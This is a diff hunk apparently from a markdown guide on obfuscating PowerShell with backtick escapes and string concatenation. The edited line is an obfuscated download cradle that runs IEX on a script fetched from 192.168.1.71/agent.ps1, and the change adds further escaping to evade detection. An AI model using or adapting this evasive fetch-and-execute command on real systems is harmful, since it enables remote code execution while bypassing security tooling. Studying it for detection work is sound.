@@ -136,7 +136,7 @@ The above string can be obfuscated using **powershell escape caracters** ` and +
 - string obfuscated<br />
 
       $get = New-Object "N`et`Web`Cl`ie`nt"
-      p`owe`r`she`l`l.exe IEX ($get).D`ow`n`loa`dSt`rin`g('h'+'t'+'tp'+':'+'//'+'192.168.1.71/agent.ps1')
+      p`owe`r`she`l`l.exe `IE`X ($get).D`ow`n`loa`dSt`rin`g('h'+'t'+'tp'+':'+'//'+'192.168.1.71/agent.ps1')
 
 ---
 
